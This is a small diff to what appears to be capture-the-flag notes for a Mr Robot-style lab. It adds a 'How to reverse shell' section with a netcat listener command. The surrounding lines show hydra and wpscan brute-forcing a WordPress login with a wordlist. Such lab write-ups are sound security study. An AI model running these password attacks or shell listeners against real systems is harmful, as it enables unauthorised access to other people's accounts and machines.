@@ -37,6 +37,11 @@ hydra -l elliot -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^
 wpscan --url http://${IP_ADDR} --passwords fsocity.dic --usernames Elliot  
 ```
 
+### How to reverse shell
+```bash
+nc -lvnp 53
+```
+
 ### Resource
 https://www.blackhillsinfosec.com/hacking-with-hydra/
 
